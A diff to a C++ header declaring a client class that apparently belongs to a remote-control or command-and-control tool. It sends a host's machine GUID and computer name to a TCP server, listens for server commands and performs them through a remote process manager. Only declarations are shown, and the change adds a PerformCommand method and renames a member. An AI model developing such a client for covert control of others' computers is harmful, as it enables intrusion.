@@ -29,6 +29,7 @@ public:
     const std::string  GetMachineGUID() const { return this->m_MachineGUID; }
     void               SetMachineGUID(auto name) { this->m_MachineGUID = name; }
     void               SetEncryptionKeys(RSAKeys& keys) { this->m_Secrets = keys; }
+
 private:
     std::string        m_ComputerName = "";  // remote host computer name. e.g DESKTOP-AJDU31S
     std::string        m_MachineGUID  = "";  // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....
@@ -40,6 +41,7 @@ private:
 public:
     Client();
     ~Client();
+
     BOOL               Connect();                   // Connect to the tcp server
     BOOL               Disconnect();                // Disconnect from the tcp server
     BYTESTRING         MakeTCPRequest(const ClientRequest& req, BOOL encrypted = FALSE); // send a message, receive the response
@@ -47,9 +49,11 @@ public:
     BOOL               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
     BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
     BOOL               ListenForServerCommands();   // listen for commands from the server and perform them
+    BOOL               PerformCommand(const ServerCommand& command); // Perform a command from the tcp server
 
     template <typename _Ty>
     BOOL               ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr);
+
 private:
     void               ReceiveCommandsFromServer(); // thread to continuously receive 'ServerCommand' messages from the server
     void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
@@ -58,7 +62,7 @@ private:
     BOOL               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
     BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
 
-    ProcessManager     Remote = {};                 // remote host process manager
+    ProcessManager     m_ProcMgr          = {};     // remote host process manager
     Server             m_TCPServerDetails = {};     // details describing the tcp server
     Server             m_UDPServerDetails = {};     // details about the UDP communication
 
